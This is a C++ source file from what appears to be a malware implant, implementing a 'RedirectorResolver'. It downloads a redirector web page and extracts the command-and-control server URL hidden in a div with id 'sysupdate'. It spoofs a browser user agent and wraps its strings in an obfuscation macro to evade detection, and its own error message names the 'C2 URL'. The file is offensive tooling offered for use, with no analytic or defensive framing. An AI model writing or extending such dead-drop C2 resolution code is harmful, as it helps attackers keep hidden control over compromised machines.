#include "RedirectorResolver.h"
#ifdef _WIN32
#include "WinHttpClient.h"
#else
#include "HttpClient.h"
#endif
#include "../core/Config.h"
#include "../utils/Obfuscator.h"
#include <regex>
#include <stdexcept>
namespace http {
RedirectorResolver::RedirectorResolver(const std::string& redirectorUrl) : redirectorUrl_(redirectorUrl) {}
std::string RedirectorResolver::resolve() {
    std::string server, path;
    std::regex urlParseRegex(R"(https?://([^/]+)(/.*))");
    std::smatch urlMatch;
    if (std::regex_search(redirectorUrl_, urlMatch, urlParseRegex)) {
        server = urlMatch[1].str();
        path = urlMatch[2].str();
    } else throw std::runtime_error(OBF("Failed to parse redirector URL: ") + redirectorUrl_);
    std::string html;
#ifdef _WIN32
    std::wstring wserver(server.begin(), server.end());
    std::wstring wpath(path.begin(), path.end());
    WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
    html = client.get(wserver, wpath);
#else
    HttpClient client(core::USER_AGENTS[0]);
    html = client.get(server, path);
#endif
    std::regex divRegex(OBF("<div[^>]+id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>"), std::regex::icase);
    std::smatch match;
    if (!std::regex_search(html, match, divRegex)) throw std::runtime_error(OBF("C2 URL not found in redirector page."));
    std::string content = match[1].str();
    std::regex urlRegex(OBF("https?://[^\\s\"'<>]+"));
    if (std::regex_search(content, match, urlRegex)) return match[0].str();
    throw std::runtime_error(OBF("No valid URL found in sysupdate div."));
}
}
